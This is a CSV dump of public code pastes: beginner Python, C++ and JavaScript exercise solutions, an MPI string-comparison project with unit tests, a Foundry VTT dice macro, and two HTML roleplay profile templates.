id,title,username,language,date,content
1zcVYMn1,Untitled,xPucTu4,Python,Thursday 9th of November 2023 12:56:13 PM CDT,"N = int(input())
special_numbers = []

for num in range(1111, 10000):
    is_special = True
    for digit in str(num):
        if int(digit) == 0 or N % int(digit) != 0:
            is_special = False
            break
    if is_special:
        special_numbers.append(str(num))

print("" "".join(special_numbers))
"
w2Pu4eV2,Untitled,xPucTu4,Python,Thursday 9th of November 2023 12:52:38 PM CDT,"# Special numbers
dividend_criteria = int(input())

for i in range(1111, 10000):
    i = str(i) # convert to string

    # for each digit in the number
    for j in range(0, len(i)):
        current_digit = int(i[j])
        if current_digit == 0:
            continue # if we manage to divide by 0, we can break the universe or worse

        if dividend_criteria % current_digit == 0:
            if j == len(i) - 1: # this is the last digit in the number - we have a special number
                print(i, end="" "")
        else: # at least one digit does not meet the criteria - not a special number
            break
"
afdPfGdf,main.cpp,HICONT,C++,Thursday 9th of November 2023 12:30:59 PM CDT,"//Copyright 2023 Soloninko Andrey
#include <iostream>
#include <gtest/gtest.h>
#include <mpi.h>

#include ""./Algo.h""

TEST(Non_Matching_Symbols, Test_1_Def)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = ""hello"";
    std::string s2 = ""halwo"";
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t1 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t1);
    }
}

TEST(Non_Matching_Symbols, Test_2_World)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = ""World"";
    std::string s2 = ""dlroW"";
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t2 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t2);
    }
}

TEST(Non_Matching_Symbols, Test_3_Same)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = ""World"";
    std::string s2 = ""World"";
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t3 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t3);
    }
}

TEST(Non_Matching_Symbols, Test_4)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = ""ripoejgpojb gjdoirepoigjpe"";
    std::string s2 = ""qwertyuiopasdfghjklzxcvbnm"";
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t4 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t4);
    }
}

TEST(Non_Matching_Symbols, Test_5_Random_String)
{
    int rankProc = 0;
    int numProc = 0;

    MPI_Comm_rank(MPI_COMM_WORLD, &rankProc);
    MPI_Comm_size(MPI_COMM_WORLD, &numProc);

    std::string s1 = random_string(10);
    std::string s2 = random_string(10);
   
    int result = GetStringDifPar(s1, s2);

    if (rankProc == 0)
    {
        int result_non_par_t5 = GetStringDifDef(s1, s2);
        ASSERT_EQ(result, result_non_par_t5);
    }
}

int main(int argc, char **argv)
{
    int res_c = 0;

    ::testing::InitGoogleTest(&argc, argv);
    ::testing::TestEventListeners &listeners =
        ::testing::UnitTest::GetInstance()->listeners();

    if (MPI_Init(&argc, &argv) != MPI_SUCCESS)
        MPI_Abort(MPI_COMM_WORLD, -1);
    res_c = RUN_ALL_TESTS();
    MPI_Finalize();

    return res_c;
}"
MnBnckwt,Algo.h,HICONT,C++,Thursday 9th of November 2023 12:30:35 PM CDT,"//Copyright 2023 Soloninko Andrey
#ifndef TASKS_TASK_1_SOLONINKO_A_NON_MATCHING_SYMBOLS_ALGO_H_
#define TASKS_TASK_1_SOLONINKO_A_NON_MATCHING_SYMBOLS_ALGO_H_

#include<string>
#include<mpi.h>
#include<random>

int GetStringDifDef(std::string s1, std::string s2);
int GetStringDifPar(std::string s1, std::string s2);
std::string random_string(int length);

#endif // TASKS_TASK_1_SOLONINKO_A_NON_MATCHING_SYMBOLS_ALGO_H_"
VY0qTjth,Algo.cpp,HICONT,C++,Thursday 9th of November 2023 12:30:12 PM CDT,"//Copyright 2023 Soloninko Andrey

#include ""task_1/soloninko_a_non_matching_symbols/Algo.h""

std::string random_string(int length)
{
    const std::string CHARACTERS = ""abcdefghijklmnopqrstuvwxyz"";

    std::random_device random_device;
    std::mt19937 generator(random_device());
    std::uniform_int_distribution<> distribution(0, CHARACTERS.size() - 1);

    std::string random_string;

    for (int i = 0; i < length; ++i)
    {
        random_string += CHARACTERS[distribution(generator)];
    }

    return random_string;
}

int GetStringDifDef(std::string s1, std::string s2)
{
    int dif_coint = 0;
    for(int i = 0; i < s1.size(); i++)
    {
        if(s1[i] != s2[i])
        {
            dif_coint++;
        }
    }
    return dif_coint;
}

int GetStringDifPar(std::string s1, std::string s2)
{
    int rank, size;
    MPI_Comm_rank(MPI_COMM_WORLD, &rank);
    MPI_Comm_size(MPI_COMM_WORLD, &size);

    int str_len = s1.length();
    std::vector<int> sendcounts(size);
    std::vector<int> displs(size);

    int segment_size = str_len / size;
    int remainder = str_len % size;

    for (int i = 0; i < size; i++) {
        sendcounts[i] = segment_size;
        if (i < remainder) {
            sendcounts[i]++;
        }

        if (i == 0) {
            displs[i] = 0;
        } else {
            displs[i] = displs[i - 1] + sendcounts[i - 1];
        }
    }

    std::string local_str1(sendcounts[rank], ' ');
    std::string local_str2(sendcounts[rank], ' ');

    MPI_Scatterv(s1.c_str(), sendcounts.data(), displs.data(), MPI_CHAR, &local_str1[0], sendcounts[rank], MPI_CHAR, 0, MPI_COMM_WORLD);
    MPI_Scatterv(s2.c_str(), sendcounts.data(), displs.data(), MPI_CHAR, &local_str2[0], sendcounts[rank], MPI_CHAR, 0, MPI_COMM_WORLD);

    int local_dif_count = 0;

    for (int i = 0; i < local_str1.length(); i++) {
        if (local_str1[i] != local_str2[i]) {
            local_dif_count++;
        }
    }

    int dif_count = 0;
    MPI_Reduce(&local_dif_count, &dif_count, 1, MPI_INT, MPI_SUM, 0, MPI_COMM_WORLD);

    return dif_count;
}"
YJDbNeWk,02. Shopping List,Spocoman,JavaScript,Thursday 9th of November 2023 12:28:24 PM CDT,"function shoppingList(input) {
    let list = input.shift().split('!');

    while (input[0] !== ""Go Shopping!"") {
        [command, product, newProduct] = input.shift().split(' ');
        if (command === ""Urgent"" && !list.includes(product)) {
            list.unshift(product);
        } else if (command === ""Unnecessary"" && list.includes(product)) {
            list.splice(list.indexOf(product), 1);
        } else if (command === ""Correct"" && list.includes(product)) {
            list.splice(list.indexOf(product), 1, newProduct);
        } else if (command === ""Rearrange"" && list.includes(product)) {
            list.push(list.splice(list.indexOf(product), 1));
        }
    }  
    console.log(list.join("", ""));
	return;
}"
BNJuJEmY,02. Shopping List,Spocoman,C++,Thursday 9th of November 2023 12:22:43 PM CDT,"#include <iostream>
#include <vector>
#include <string>

using namespace std;

vector<string> vectorFiller(string str, char sep) {
    vector<string> v;
    string p = """";

    for (int i = 0; i < str.length(); i++) {
        if (str[i] == sep) {
            v.push_back(p);
            p = """";
        }
        else {
            p += str[i];
        }
    }
    v.push_back(p);
    return v;
}

int index(vector<string> v, string s) {
    for (int i = 0; i < v.size(); i++) {
        if (v[i] == s) {
            return i;
        }
    }
    return -1;
}

int main() {
    string line, product, newProduct, command;
    getline(cin, line);

    vector<string> list = vectorFiller(line, '!');

    while (true) {
        getline(cin, line);
        if (line == ""Go Shopping!"") {
            break;
        }

        vector<string> currentLine = vectorFiller(line, ' ');
        command = currentLine[0];
        product = currentLine[1];

        if (command == ""Urgent"" && index(list, product) == -1) {
            list.insert(list.begin(), product);
        }
        else if (command == ""Unnecessary"" && index(list, product) != -1) {
            list.erase(list.begin() + index(list, product));
        }
        else if (command == ""Correct"" && index(list, product) != -1) {
            newProduct = currentLine[2];
            list[index(list, product)] = newProduct;
        }
        else if (command == ""Rearrange"" && index(list, product) != -1) {
            list.erase(list.begin() + index(list, product));
            list.push_back(product);
        }
    }

    for (int i = 0; i < list.size() - 1; i++) {
        cout << list[i] << "", "";
    }
    cout << list[list.size() - 1] << endl;
    return 0;
}"
b3Vfpekt,Bone Carver's Chisel Macro,CantFindGeorge,JavaScript,Thursday 9th of November 2023 12:22:42 PM CDT,"// Bone Carver's Chisel Macro

// Creates dialogue box and prompts user for entry
await Dialog.prompt({
    title: `Bone Carver's Chisel - Consume A Bone?`,
    content: `
        <div class=""form-group"">
            <label for=""exampleSelect"">Which size bone would you like to use?</label>
            <select name=""exampleSelect"">
              <option value=""Bones - Small"">Small (1d4)</option>
              <option value=""Bones - Medium"">Medium (1d6)</option>
              <option value=""Bones - Large"">Large (1d8)</option>
              <option value=""Bones - Huge"">Huge (1d10)</option>
              <option value=""Bones - Gargantuan"">Gargantuan (1d12)</option>
            </select>
        </div>
        <br><br>
    `,

    callback: async(html) => {

        // Gather user input from prompt
        const bonePrompt = html[0].querySelector(""[name='exampleSelect']"").value;
        
        // Find bone from prompt in actor's inventory
        let boneSize = actor.items.getName(bonePrompt);

        // -----------------------
        // CHECKS ACTORS INVENTORY
        // -----------------------

        // No bones in inventory
        if (boneSize == null || boneSize == undefined){
            ui.notifications.error(""You don't have any bones of that size."")
            return;
        }


        // Bone is in inventory
        if (boneSize >= 1){


            // Assigns a die size based on user input
            let boneDice
            if(boneSize = ""Bones - Small""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d4`
            }
            if(boneSize = ""Bones - Medium""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d6`
            }
            if(boneSize = ""Bones - Large""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d8`
            }
            if(boneSize = ""Bones - Huge""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d10`
            }
            if(boneSize = ""Bones - Gargantuan""){
                boneDice = `<br><h2>Bone Carver's Chisel</h2><br><u>${bonePrompt}</u><br><br>/r 1d12`
            }

            // Removes bone from inventory
            await boneSize.update({""data.quantity"": boneSize.data.data.quantity - 1})
            // If less than 1 bone delete item from inventory
            if(boneSize.data.data.quantity < 1){
                boneSize.delete()
            }

            await ChatMessage.create({
                content: `${boneDice}`,
    
            })
        }



        
    }
});"
6K2CtuDf,36. grind me {pos de rol},elirosecodes,HTML,Thursday 9th of November 2023 12:22:20 PM CDT,"<link href=""https://dl.dropboxusercontent.com/scl/fi/w3nf9kvhg0g7cj9lxtgza/grind.css?rlkey=cyytyr7bwvx110e6fmiokfact&dl=0"" rel=""stylesheet""><link rel=""stylesheet"" href=""//icons.cappuccicons.com/cpf.css""><div class=""grindme"" style=""background-image:url(https://i.imgur.com/mR39dGU.png);""><div class=""grmd-s1""><div class=""grmd-s1t""><div class=""grmd-s1tl"">Press me up against your lips</div><div class=""grmd-s1ts"">fill your lungs</div><div class=""grmd-s1st"">Then breathe me out</div></div></div><div class=""grmd-s2""><div class=""grmd-s2b"">
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras faucibus velit eleifend est pellentesque, sit amet tempus nibh elementum. Integer non ornare erat. Phasellus fringilla, elit a luctus convallis, urna magna tincidunt ante, non lacinia metus diam sit amet nulla. Morbi felis ipsum, ultrices a maximus vel, volutpat vel mi. Donec venenatis massa neque, nec vulputate est aliquam sit amet. Cras sed tellus porta arcu pellentesque volutpat. Ut in elit justo. Sed ut mauris felis. Proin sagittis tortor tempus nisi condimentum, vel semper purus tempus. Sed congue pulvinar pharetra. Mauris sit amet feugiat lorem. Quisque tincidunt, elit vel vulputate auctor, ipsum lectus hendrerit lectus, vel euismod tortor tellus posuere ante.
<div class=""grmd-s2sc""><a href=""/""><i class=""cp cp-cigarette""></i><br><span>outfit</span></a></div></div></div></div><a href=""https://elirosecodes.tumblr.com/""><div class=""gnomo"">elirose</div></a>"
kMhWyeup,35. Our year {relaciones},elirosecodes,HTML,Thursday 9th of November 2023 12:21:47 PM CDT,"<link href=""https://dl.dropboxusercontent.com/scl/fi/w6fqlijp81bnluag9uacl/ouryear.css?rlkey=i4rbvr6hpajqc1fvtfpbxi0bo&dl=0"" rel=""stylesheet""><link rel=""stylesheet"" href=""//icons.cappuccicons.com/cpf.css""><div class=""our-year""><div class=""oy-s1""><div class=""oy-s1a"">our year</div><div class=""oy-s1b"">this is our summer night, our winter time</div></div><div class=""oy-s2""><div class=""oy-s2a""><div class=""oy-s2a1""><i class=""cp cp-flower""></i><span>love</span></div><div class=""oy-s2a1""><i class=""cp cp-sun""></i><span>friends</span></div><div class=""oy-s2a1""><i class=""cp cp-leaf""></i><span>neutral</span></div><div class=""oy-s2a1""><i class=""cp cp-snowflake""></i><span>hate</span></div></div><div class=""oy-s2b"">

/*Primavera*/
<div class=""oy-bx oy-lv""><div class=""oy-bx1""><div class=""oy-bx1a"" style=""background-image:url(https://via.placeholder.com/60x65);""></div><div class=""oy-bx1b"">Nombre del personaje</div></div><div class=""oy-bx2"">my dear beloved one</div><i class=""cp cp-flower""></i><div class=""oy-bx3"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel. Nulla auctor nulla elementum erat lacinia, eu maximus dui fringilla. Suspendisse eget venenatis orci. Aenean consectetur lectus at lacinia convallis. Nunc eget faucibus ex. Vivamus quis interdum nunc, sit amet dapibus nunc. Fusce orci ligula, mollis in porttitor vel, convallis vel lorem. Etiam nec nisi est. Donec vel auctor justo, in consequat turpis.
</div></div>

/*Verano*/
<div class=""oy-bx oy-fr""><div class=""oy-bx1""><div class=""oy-bx1a"" style=""background-image:url(https://via.placeholder.com/60x65);""></div><div class=""oy-bx1b"">Nombre del personaje</div></div><div class=""oy-bx2"">my dear beloved one</div><i class=""cp cp-sun""></i><div class=""oy-bx3"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel. Nulla auctor nulla elementum erat lacinia, eu maximus dui fringilla. Suspendisse eget venenatis orci. Aenean consectetur lectus at lacinia convallis. Nunc eget faucibus ex. Vivamus quis interdum nunc, sit amet dapibus nunc. Fusce orci ligula, mollis in porttitor vel, convallis vel lorem. Etiam nec nisi est. Donec vel auctor justo, in consequat turpis.
</div></div>

/*Otoño*/
<div class=""oy-bx oy-ne""><div class=""oy-bx1""><div class=""oy-bx1a"" style=""background-image:url(https://via.placeholder.com/60x65);""></div><div class=""oy-bx1b"">Nombre del personaje</div></div><div class=""oy-bx2"">my dear beloved one</div><i class=""cp cp-leaf""></i><div class=""oy-bx3"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel. Nulla auctor nulla elementum erat lacinia, eu maximus dui fringilla. Suspendisse eget venenatis orci. Aenean consectetur lectus at lacinia convallis. Nunc eget faucibus ex. Vivamus quis interdum nunc, sit amet dapibus nunc. Fusce orci ligula, mollis in porttitor vel, convallis vel lorem. Etiam nec nisi est. Donec vel auctor justo, in consequat turpis.
</div></div>

/*Invierno*/
<div class=""oy-bx oy-ht""><div class=""oy-bx1""><div class=""oy-bx1a"" style=""background-image:url(https://via.placeholder.com/60x65);""></div><div class=""oy-bx1b"">Nombre del personaje</div></div><div class=""oy-bx2"">my dear beloved one</div><i class=""cp cp-snowflake""></i><div class=""oy-bx3"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel. Nulla auctor nulla elementum erat lacinia, eu maximus dui fringilla. Suspendisse eget venenatis orci. Aenean consectetur lectus at lacinia convallis. Nunc eget faucibus ex. Vivamus quis interdum nunc, sit amet dapibus nunc. Fusce orci ligula, mollis in porttitor vel, convallis vel lorem. Etiam nec nisi est. Donec vel auctor justo, in consequat turpis.
</div></div>
 
</div></div><div class=""oy-s3""><div class=""oy-s3a""><div class=""oy-s3a1""></div><div class=""oy-s3a2"">this is our fall morning, our spring moment</div></div><div class=""oy-s3b"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis interdum congue ipsum id pharetra. Lorem ipsum dolor sit amet, consectetur adipiscing elit. In lobortis eros id tellus interdum, eu suscipit mi gravida. Integer tempor felis purus, at facilisis diam imperdiet vel.</div></div></div><a href=""https://elirosecodes.tumblr.com/""><div class=""gnomo"">elirose</div></a><style>:root{--oy-wt: #fff; --oy-bg: #454545; --oy-tx: #000; --oy-cl: #E6D1F0; --oy-lv: #FFD6E9; --oy-fr: #CBDDA6; --oy-ne: #FCD6BD; --oy-ht: #A9DEF9;}</style>"
